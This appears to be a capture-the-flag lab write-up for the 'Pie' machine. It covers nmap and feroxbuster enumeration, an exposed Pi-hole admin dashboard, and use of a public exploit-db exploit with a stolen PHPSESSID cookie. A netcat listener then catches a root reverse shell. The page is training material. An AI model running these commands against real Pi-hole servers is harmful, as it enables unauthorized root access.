---
description: https://www.cyberseclabs.co.uk/labs/info/Pie/
---

# Pie

![](<../../../.gitbook/assets/image (636).png>)

## Nmap

```
nmap 172.31.1.26 -p- -A

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:a9:75:4c:34:de:ee:58:23:83:dc:b1:00:fc:3f:d4 (RSA)
|   256 26:44:00:05:82:b6:d2:2e:6a:34:34:91:83:73:fd:50 (ECDSA)
|_  256 65:d2:02:da:22:74:71:5c:e1:30:3e:64:ea:37:a0:d3 (ED25519)
53/tcp open  domain  dnsmasq pi-hole-2.81
| dns-nsid: 
|_  bind.version: dnsmasq-pi-hole-2.81
80/tcp open  http    lighttpd 1.4.45
|_http-server-header: lighttpd/1.4.45
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

Unless we opted to brute force SSH on port 22 HTTP on port 80 is going to be our best attack vector. The root page on 172.31.1.26 takes us to the following page for Pi-hole.

![http://172.31.1.26](<../../../.gitbook/assets/image (637).png>)

I decided to use feroboxbuster to enumerate further web directories. Using the `-s` switch we can select only results for specific return codes. The `-q` switch further reduces output.

```
feroxbuster -u http://172.31.1.26/ -s 301,200 -q
```

![](<../../../.gitbook/assets/image (638).png>)

Browsing to [http://172.31.1.26/admin/](http://172.31.1.26/admin/) we find we are already signed into the administrator's dashboard.

![http://172.31.1.26/admin/](<../../../.gitbook/assets/image (640) (1).png>)

Going to help on the left and scrolling down we can see what version of Pi-hole we are running.

![http://172.31.1.26/admin/settings.php](<../../../.gitbook/assets/image (641).png>)

Performing a Google search for Pi-hole exploits one of the top results is from exploit-db.com which I have linked below.

{% embed url="https://www.exploit-db.com/exploits/48443" %}

This exploit meets our criteria where is affects versions of Pi-hole 4.4 and before. Other exploits also require knowing the password for authentication in which we do not. This exploit above requires a session cookie in which we can provide since are logged in.

![](<../../../.gitbook/assets/image (642).png>)

In Firefox whilst logged into the dashboard we can open the console window with CTRL + SHIFT + I.

![](<../../../.gitbook/assets/image (643).png>)

Move into storage and make a note of the value next to the PHPSESSID. This is our session cookie in which we need for the exploit.

Before we run the exploit start `netcat` with the following command:

```
nc -lvp 4455
```

When ready run the exploit with the following syntax:

```
sudo python3 exploit.py <SessionCookie> http://172.31.1.26/ <IP> 4455
```

![](<../../../.gitbook/assets/image (646).png>)

When checking our `netcat` listener we should have caught a shell as root.

![](<../../../.gitbook/assets/image (647).png>)
